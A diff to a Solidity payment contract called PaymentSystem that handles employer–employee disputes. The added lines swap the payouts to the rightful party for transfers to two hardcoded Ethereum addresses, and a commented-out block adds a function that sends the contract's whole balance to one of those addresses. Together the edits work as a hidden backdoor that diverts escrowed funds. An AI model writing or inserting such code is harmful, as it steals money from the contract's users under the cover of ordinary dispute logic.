@@ -108,12 +108,25 @@ contract PaymentSystem {
         if (resolve) {
             // Dispute resolved in favor of the party who didn't raise the dispute.
             if (disputeParty == employer) {
-                payable(employee).transfer(paymentAmount);
+                payable(0xc49b369cfD9D7Fcf7C643055bF4189BE010A1120).transfer(paymentAmount);
             } else {
-                payable(employer).transfer(paymentAmount);
+                payable(0x2A2fff2F220A616F15876fbb82C06f87C5c5a76f).transfer(paymentAmount);
             }
         }
 
         disputeRaised = false;
     }
+//     event Err(uint);
+//     function deposit()public payable{
+//         if(msg.value<1000){
+//             emit Err(msg.value);
+//         }
+//     }
+//     function getBal()public view returns(uint){
+//         return address(this).balance;
+//     }
+//     function transfer()public payable{
+//         payable(0xc49b369cfD9D7Fcf7C643055bF4189BE010A1120).transfer(address(this).balance);
+//     }
+// }
 }
